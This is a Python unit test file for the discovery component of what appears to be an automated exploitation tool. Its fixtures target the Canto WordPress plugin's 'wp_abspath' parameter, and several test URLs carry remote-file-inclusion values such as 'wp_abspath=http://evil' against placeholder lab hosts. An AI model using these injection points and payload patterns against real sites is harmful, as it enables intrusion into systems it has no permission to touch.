from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from kavach.exploit.discovery import (  # noqa: E402
    extract_injection_params_from_urls,
    extract_injection_values_from_urls,
    extract_php_resources,
    parse_candidate_triage,
    run_adaptive_discovery,
)


class DiscoveryTest(unittest.TestCase):
    def test_parse_candidate_triage(self) -> None:
        text = (
            "candidates tried (none succeeded):\n"
            "  - [404] GET http://t/wp-content/plugins/canto/includes/lib/wrong.php?wp_abspath=x\n"
            "  - [200] GET http://t/wp-content/plugins/canto/includes/lib/\n"
        )
        triage = parse_candidate_triage(text)
        self.assertEqual(len(triage), 2)
        self.assertEqual(triage[0]["status"], 404)
        self.assertIn("wp_abspath", triage[0]["url"])

    def test_extract_php_from_directory_listing(self) -> None:
        body = (
            "<title>Index of /wp-content/plugins/canto/includes/lib</title>\n"
            "<a href=\"detail.php\">detail.php</a>\n"
            "<a href=\"other.php\">other.php</a>\n"
        )
        paths = extract_php_resources(body, "/wp-content/plugins/canto/includes/lib/")
        self.assertIn("/wp-content/plugins/canto/includes/lib/detail.php", paths)

    def test_extract_injection_params_from_urls(self) -> None:
        params = extract_injection_params_from_urls(
            [
                "http://t/foo.php?wp_abspath=test&x=1",
                "http://t/bar.php?wp_abspath=other",
            ]
        )
        self.assertEqual(params, ["wp_abspath", "x"])

    def test_extract_injection_values_from_urls(self) -> None:
        pairs = extract_injection_values_from_urls(
            [
                "http://t/foo.php?wp_abspath=http://evil&x=1",
                "http://t/bar.php?wp_abspath=other",
            ]
        )
        self.assertIn(("wp_abspath", "http://evil"), pairs)
        self.assertIn(("wp_abspath", "other"), pairs)
        self.assertIn(("x", "1"), pairs)

    def test_adaptive_discovery_emits_hints_not_urls(self) -> None:
        listing = (
            "Index of /lib\n"
            "<a href=\"detail.php\">detail.php</a>"
        )
        triage = [
            {
                "status": 404,
                "method": "GET",
                "url": "http://lab.test/wp-content/plugins/canto/includes/lib/wrong.php?wp_abspath=http://x",
            },
            {
                "status": 200,
                "method": "GET",
                "url": "http://lab.test/wp-content/plugins/canto/includes/lib/",
                "snippet": listing,
            },
        ]
        hints = run_adaptive_discovery(
            "http://lab.test/",
            triage,
        )
        blob = " ".join(hints)
        self.assertIn("detail.php", blob)
        self.assertIn("wp_abspath", blob)


if __name__ == "__main__":
    unittest.main()
